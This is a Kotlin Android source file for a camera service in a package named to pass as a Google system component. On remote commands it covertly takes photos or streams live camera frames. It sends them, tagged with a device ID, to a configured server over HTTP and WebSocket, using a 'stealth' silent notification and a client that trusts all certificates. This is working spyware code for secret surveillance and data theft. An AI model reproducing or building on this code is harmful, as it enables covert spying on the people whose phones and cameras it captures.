package com.google.android.systemservice.services

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.content.pm.PackageManager
import android.util.Base64
import android.util.Log
import android.util.Size
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import com.google.android.systemservice.utils.WsMessageHelper
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class CameraService : BaseService() {
    companion object {
        private const val TAG = "SystemCamera"
    }

    override val serviceTag = TAG
    override val foregroundServiceId = StealthNotificationHelper.CAMERA_SERVICE_ID

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    @Volatile private var isStreaming = false
    private var webSocket: WebSocket? = null

    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CameraService created")
        startForegroundSilent()
        startBackgroundThread()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val cameraId = intent?.getStringExtra("camera_id") ?: "0"
        
        when (intent?.action) {
            "START_STREAM" -> startCameraStream(cameraId)
            "STOP_STREAM" -> stopCameraStream()
            "TAKE_PHOTO" -> takePhoto(cameraId)
        }
        return START_STICKY
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread?.looper ?: return)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join(5000)
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun takePhoto(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            stopSelf()
            return
        }
        Log.d(TAG, "Taking photo with camera $cameraId")
        
        val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        
        try {
            val characteristics = manager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                ?: Size(640, 480)

            imageReader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        
                        sendPhotoToServer(bytes, cameraId)
                        closeCameraSession()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in image listener: ${e.message}")
                }
            }, backgroundHandler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    camera.close()
                    cameraDevice = null
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            Log.e(TAG, "Error taking photo: ${e.message}")
        }
    }

    private fun createCaptureSession() {
        try {
            val surface = imageReader?.surface ?: return
            
            cameraDevice?.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        captureStillPicture()
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error creating capture session: ${e.message}")
        }
    }

    private fun captureStillPicture() {
        try {
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(imageReader?.surface ?: return)
            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)

            captureSession?.stopRepeating()
            captureSession?.abortCaptures()
            val request = captureBuilder?.build() ?: return
            captureSession?.capture(request, null, backgroundHandler)
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing picture: ${e.message}")
        }
    }

    private fun sendPhotoToServer(photoBytes: ByteArray, cameraId: String) {
        serviceScope.launch {
            try {
                AndroidConfig.loadFromPreferences(this@CameraService)
                val deviceId = com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(this@CameraService)

                val base64Photo = Base64.encodeToString(photoBytes, Base64.NO_WRAP)

                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("camera_id", cameraId)
                    put("photo", base64Photo)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(AndroidConfig.photosEndpoint)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Photo sent successfully")
                    } else {
                        Log.e(TAG, "Failed to send photo: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending photo: ${e.message}")
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun startCameraStream(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            stopSelf()
            return
        }
        Log.d(TAG, "Starting camera stream with camera $cameraId")
        isStreaming = true
        
        // Connect WebSocket for streaming
        connectStreamWebSocket(cameraId)
    }

    private fun connectStreamWebSocket(cameraId: String) {
        val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${AndroidConfig.deviceId}"
        val request = Request.Builder()
            .url(wsUrl)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Stream WebSocket connected")
                startStreamingFrames(cameraId)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Stream WebSocket error: ${t.message}")
                isStreaming = false
            }
        })
    }

    @SuppressLint("MissingPermission")
    private fun startStreamingFrames(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            stopSelf()
            return
        }

        try {
            closeCameraSession()
            val reader = buildImageReader(640, 480, cameraId)
            imageReader = reader
            openCameraForStreaming(cameraId, reader)
        } catch (e: Exception) {
            Log.e(TAG, "Error starting frame stream: ${e.message}")
            isStreaming = false
        }
    }

    private fun buildImageReader(width: Int, height: Int, cameraId: String): ImageReader {
        val reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 3)
        reader.setOnImageAvailableListener({ imgReader ->
            if (!isStreaming) return@setOnImageAvailableListener

            val image = imgReader.acquireLatestImage()
            if (image != null) {
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    sendFrameViaWebSocket(bytes, cameraId)
                } finally {
                    image.close()
                }
            }
        }, backgroundHandler)
        return reader
    }

    @SuppressLint("MissingPermission")
    private fun openCameraForStreaming(cameraId: String, imageReader: ImageReader) {
        val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return

        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                createStreamingSession(camera, imageReader)
            }

            override fun onDisconnected(camera: CameraDevice) {
                camera.close()
                cameraDevice = null
                isStreaming = false
            }

            override fun onError(camera: CameraDevice, error: Int) {
                Log.e(TAG, "Camera stream error: $error")
                camera.close()
                cameraDevice = null
                isStreaming = false
            }
        }, backgroundHandler)
    }

    private fun createStreamingSession(camera: CameraDevice, imageReader: ImageReader) {
        try {
            camera.createCaptureSession(
                listOf(imageReader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        startRepeatingCapture(session, camera, imageReader)
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Streaming session configuration failed")
                        isStreaming = false
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error creating streaming session: ${e.message}")
            isStreaming = false
        }
    }

    private fun startRepeatingCapture(session: CameraCaptureSession, camera: CameraDevice, imageReader: ImageReader) {
        try {
            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
            captureBuilder.addTarget(imageReader.surface)
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)

            session.setRepeatingRequest(captureBuilder.build(), null, backgroundHandler)
            Log.d(TAG, "Started repeating capture for streaming")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting repeating capture: ${e.message}")
            isStreaming = false
        }
    }
    
    private fun sendFrameViaWebSocket(frameBytes: ByteArray, cameraId: String) {
        serviceScope.launch {
            try {
                val base64Frame = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
                
                val json = JSONObject().apply {
                    put("command", "subscribe")
                    put("identifier", JSONObject().apply {
                        put("channel", "StreamingChannel")
                    }.toString())
                }
                
                WsMessageHelper.sendChannelMessage(webSocket, "StreamingChannel") {
                    put("action", "camera_frame")
                    put("frame", base64Frame)
                    put("camera_id", cameraId)
                    put("timestamp", System.currentTimeMillis())
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending frame: ${e.message}")
            }
        }
    }

    private fun stopCameraStream() {
        Log.d(TAG, "Stopping camera stream")
        isStreaming = false
        try { webSocket?.close(1000, "Stream stopped") } catch (e: Exception) { Log.e(TAG, "WS close failed", e) }
        closeCameraSession()
    }

    private fun closeCameraSession() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
    }

    override fun onDestroy() {
        stopCameraStream()
        stopBackgroundThread()
        super.onDestroy()
    }
}
